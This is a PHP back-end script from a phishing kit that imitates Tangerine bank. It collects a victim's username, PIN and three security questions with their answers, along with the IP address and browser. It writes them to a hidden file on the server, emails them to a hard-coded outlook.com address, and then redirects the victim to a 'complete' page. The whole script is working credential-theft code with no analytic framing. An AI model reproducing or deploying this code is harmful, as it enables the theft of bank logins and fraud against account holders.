<?php

error_reporting(0);
$send = "ventura514@outlook.com";

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "----------------------------------\n";
$message .= "username : ".$_POST['username']."\n";
$message .= "pin : ".$_POST['pin']."\n";
$message .= "----------------------------------\n";
$message .= "question : ".$_POST['question1']."\n";
$message .= "answer : ".$_POST['answer1']."\n";
$message .= "question : ".$_POST['question2']."\n";
$message .= "answer : ".$_POST['answer2']."\n";
$message .= "question : ".$_POST['question3']."\n";
$message .= "answer : ".$_POST['answer3']."\n";
$message .= "----------------------------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------------------------\n";

$subject = "Tangerine";

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/ehtgdfh4w3.txt","a+");
fwrite($fp,"Tangerine" . " | " .getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");
fclose($fp);

mail($send , "Tangerine", getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");

?>
<script>
    window.top.location.href = "complete.php";

</script>